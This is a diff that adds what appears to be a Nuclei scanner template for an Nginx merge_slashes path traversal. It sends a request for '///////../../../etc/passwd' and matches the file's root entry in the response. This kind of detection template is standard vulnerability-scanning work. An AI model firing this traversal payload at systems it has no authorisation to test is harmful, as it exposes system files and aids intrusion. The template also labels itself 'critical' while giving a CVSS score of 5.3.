@@ -1,0 +1,30 @@
+id: ngnix-traversal
+
+info:
+  name: Nginx - Merge Slashes Path Traversal
+  author: omkar
+  severity: critical
+  description: Targets the merge_slashes directive in Ngnix, which when set to 'off', allows multiple slashes in a URI to remain unnormalized.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-200
+  metadata:
+    max-request: 1
+  tags: ngnix,lfi,misconfig
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}///////../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
+          - 206
